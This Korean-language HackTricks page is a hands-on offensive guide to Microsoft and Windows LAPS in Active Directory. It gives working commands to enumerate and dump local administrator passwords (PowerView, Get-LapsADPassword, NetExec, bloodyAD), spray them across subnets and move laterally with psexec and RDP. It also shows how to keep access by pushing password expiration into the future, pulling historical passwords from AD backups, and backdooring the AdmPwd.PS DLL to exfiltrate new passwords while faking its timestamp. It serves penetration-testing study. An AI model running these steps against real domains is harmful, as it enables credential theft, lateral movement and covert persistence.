# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

현재 평가 중에 접할 수 있는 **2가지 LAPS 종류**가 있습니다:

- **Legacy Microsoft LAPS**: local administrator password를 **`ms-Mcs-AdmPwd`**에 저장하고 expiration time을 **`ms-Mcs-AdmPwdExpirationTime`**에 저장합니다.
- **Windows LAPS** (April 2023 updates부터 Windows에 내장됨): 여전히 legacy mode를 에뮬레이트할 수 있지만, native mode에서는 **`msLAPS-*`** attributes를 사용하며, **password encryption**, **password history**, domain controllers용 **DSRM password backup**을 지원합니다.

LAPS는 **local administrator passwords**를 관리하도록 설계되어 있으며, domain-joined computers에서 이들을 **unique, randomized, and frequently changed** 상태로 만듭니다. 이 attributes를 읽을 수 있다면, 일반적으로 affected host에 대해 **local admin으로 pivot**할 수 있습니다. 많은 환경에서 중요한 것은 password 자체를 읽는 것뿐 아니라, password attributes에 **누가 delegated access를 받았는지** 찾는 것입니다.

### Legacy Microsoft LAPS attributes

domain의 computer objects에서 legacy Microsoft LAPS 구현은 두 개의 attributes를 추가합니다:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS는 computer objects에 여러 새 attributes를 추가합니다:

- **`msLAPS-Password`**: encryption이 활성화되지 않았을 때 JSON으로 저장되는 clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers용 encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: newer rollback-detection logic (Windows Server 2025 forest schema)에서 사용되는 GUID-based version tracking

**`msLAPS-Password`**를 읽을 수 있으면, 그 값은 account name, update time, 그리고 clear-text password를 포함하는 JSON object이며, 예를 들면:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 활성화되어 있는지 확인하기
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`에서 **raw LAPS policy**를 다운로드한 다음, [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) 패키지의 **`Parse-PolFile`**을 사용해 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.

### Legacy Microsoft LAPS PowerShell cmdlets

legacy LAPS module이 설치되어 있다면, 보통 다음 cmdlets를 사용할 수 있습니다:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS는 새로운 PowerShell 모듈과 새로운 cmdlets를 제공합니다:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
몇 가지 운영상 세부사항이 여기서 중요합니다:

- **`Get-LapsADPassword`**는 **legacy LAPS**, **clear-text Windows LAPS**, 그리고 **encrypted Windows LAPS**를 자동으로 처리합니다.
- password가 encrypted되어 있고 **read**는 할 수 있지만 **decrypt**는 할 수 없다면, cmdlet은 clear-text password를 반환할 수 없더라도 **`Source`**, **`DecryptionStatus`**, **`AuthorizedDecryptor`** 같은 metadata를 반환합니다.
- **encrypted Windows LAPS**에서는 **read permission**과 **decrypt permission**이 **서로 다른 control**입니다. OU / object read access가 있다고 해서 자동으로 **`msLAPS-EncryptedPassword`**를 decrypt할 수 있는 것은 아닙니다.
- **Password history**는 **Windows LAPS encryption**이 enabled된 경우에만 사용할 수 있습니다.
- domain controller에서는 반환되는 source가 **`EncryptedDSRMPassword`**일 수 있습니다.

이것은 assessment 중에 유용합니다. **`AuthorizedDecryptor`** field가 blob이 누구를 위해 encrypted되었는지 알려주기 때문에, 실패한 password read를 새로운 privilege-escalation target으로 바꿀 수 있기 때문입니다.

### PowerView / LDAP

**PowerView**는 **누가 password를 read할 수 있는지, 그리고 실제로 read하는지** 알아내는 데에도 사용할 수 있습니다:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
If **`msLAPS-Password`**가 readable하면, 반환된 JSON을 parse하고 password에 대해 **`p`**, managed local admin account name에 대해 **`n`**을 추출하세요.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
그 **`n`** 필드는 최신 배포에서 중요합니다. **Windows LAPS automatic account management**가 내장된 **`Administrator`** 대신 **custom account**를 대상으로 할 수 있고, 더 최신 **Windows 11 24H2 / Windows Server 2025** 시스템은 그 계정 이름을 **randomize**할 수도 있기 때문입니다.

### Linux / remote tooling

Modern tooling는 legacy Microsoft LAPS와 Windows LAPS를 모두 지원합니다.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
참고:

- 최근 **NetExec** 빌드는 **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, **`msLAPS-EncryptedPassword`**를 지원합니다.
- **`pyLAPS`**는 Linux에서 **legacy Microsoft LAPS**를 다루는 데 여전히 유용하지만, **`ms-Mcs-AdmPwd`**만 대상으로 합니다.
- **`LAPS4LINUX`**, **`dpapi-ng`** 기반 tooling, 그리고 최근 **NetExec** workflows 같은 더 새로운 cross-platform tooling은 non-Windows hosts에서도 **native Windows LAPS**를 처리할 수 있습니다.
- 환경이 **encrypted Windows LAPS**를 사용한다면, 단순한 LDAP read만으로는 충분하지 않습니다. **authorized decryptor**(또는 offline domain DPAPI-NG root key material 같은 동등한 decryption material)도 필요합니다.
- **Windows 11 24H2 / Windows Server 2025**에서는 관리되는 local admin이 항상 **`Administrator`**라고 가정하지 마세요. Automatic account management가 custom account를 만들고 이름을 옵션으로 randomize할 수 있으므로, **`--laps`**를 대규모로 사용하기 전에 먼저 **`n`** / **`Account`**를 통해 account name을 확인하세요.

### Directory synchronization abuse

도메인 수준의 **directory synchronization** 권한이 있고 각 computer object에 대한 직접 read access가 없다 하더라도, LAPS는 여전히 흥미로울 수 있습니다.

**`DS-Replication-Get-Changes`**와 **`DS-Replication-Get-Changes-In-Filtered-Set`** 또는 **`DS-Replication-Get-Changes-All`**의 조합은 legacy **`ms-Mcs-AdmPwd`** 같은 **confidential / RODC-filtered** attributes를 synchronize하는 데 사용할 수 있습니다. BloodHound는 이를 **`SyncLAPSPassword`**로 모델링합니다. replication-rights 배경은 [DCSync](dcsync.md)를 확인하세요.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)은 여러 functions로 LAPS enumeration을 쉽게 해줍니다.\
그중 하나는 **LAPS가 활성화된 모든 computers**에 대해 **`ExtendedRights`**를 parsing하는 것입니다. 이를 통해 **LAPS passwords를 읽도록 특별히 delegated 된 groups**가 표시되며, 이들은 종종 protected groups의 users입니다.\
domain에 computer를 **join한 account**는 해당 host에 대해 `All Extended Rights`를 받으며, 이 권한은 그 **account**가 **passwords를 읽을 수 있게** 해줍니다. Enumeration을 통해 host의 LAPS password를 읽을 수 있는 user account가 드러날 수 있습니다. 이는 LAPS passwords를 읽을 수 있는 특정 AD users를 **target**하는 데 도움이 됩니다.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec로 LAPS Password Dumping하기

인터랙티브 PowerShell이 없다면, LDAP를 통해 원격으로 이 권한을 악용할 수 있습니다:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
이것은 사용자가 읽을 수 있는 모든 LAPS secrets를 dump하며, 다른 local administrator password를 사용해 laterally move할 수 있게 해줍니다.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Expiration Date

관리자 권한을 얻으면, **passwords**를 **획득**하고 **expiration date를 미래로 설정**하여 한 machine이 **password**를 **업데이트**하지 못하게 **방지**할 수 있습니다.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS는 대신 **`msLAPS-PasswordExpirationTime`**를 사용합니다:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> 암호는 **admin**이 **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**를 사용하거나, **Do not allow password expiration time longer than required by policy**가 활성화된 경우에도 계속 회전합니다.

### 새로운 Windows LAPS에서의 snapshot rollback 주의사항

이전의 snapshot / image rollback 기법은 최근 **Windows LAPS** 배포에서 **덜 신뢰할 수 있습니다**. **Windows 11 24H2 / Windows Server 2025**에서, forest schema에 **`msLAPS-CurrentPasswordVersion`**(**Windows Server 2025 forest schema**)가 포함되어 있으면, client는 로컬에 캐시된 GUID를 AD에 저장된 값과 비교하고, rollback으로 **torn state**가 생성되면 **즉시 password를 회전**합니다.

실제로 이는 snapshot 기반 persistence나 이전에 알고 있던 local admin password를 되살리려는 시도가 다음 정상 만료 때까지 살아남는 대신 빠르게 무력화될 수 있음을 의미합니다.

이 보호는 **AD-backed Windows LAPS**에만 적용되며, 되돌린 머신이 여전히 **AD에 authenticate**할 수 있어야 합니다. 머신이 더 이상 AD와 통신할 수 없다면, **password history**나 **AD backup access**가 여전히 도움이 될 수 있습니다.

### automatic account management 변조 주의사항

**automatic account management**가 활성화되어 있으면, Windows LAPS가 관리되는 local admin account의 lifecycle을 담당합니다. 해당 account를 이름 변경, 재구성 또는 다른 방식으로 건드리려는 예상치 못한 시도는 **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**로 거부될 수 있으므로, 관리되는 LAPS account를 조용히 수정하는 데 의존하는 persistence는 최신 endpoint에서 덜 신뢰할 수 있습니다.

### AD backups에서 historical passwords 복구하기

**Windows LAPS encryption + password history**가 활성화되어 있으면, 마운트된 AD backups가 추가적인 secret source가 될 수 있습니다. 마운트된 AD snapshot에 접근하고 **recovery mode**를 사용할 수 있다면, live DC와 통신하지 않고도 이전에 저장된 password를 조회할 수 있습니다.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
이것은 주로 **AD backup theft**, **offline forensics abuse**, 또는 **disaster-recovery media access** 중에 관련이 있습니다.

### Backdoor

레거시 Microsoft LAPS의 원본 소스 코드는 [here](https://github.com/GreyCorbel/admpwd)에서 찾을 수 있으므로, 코드에 backdoor를 넣는 것이 가능합니다(예를 들어 `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부). 이렇게 하면 어떤 방식으로든 **새로운 passwords를 exfiltrate하거나 어딘가에 저장**할 수 있습니다.

그다음, 새 `AdmPwd.PS.dll`을 컴파일해서 머신의 `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`에 업로드하고(그리고 modification time을 변경합니다).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
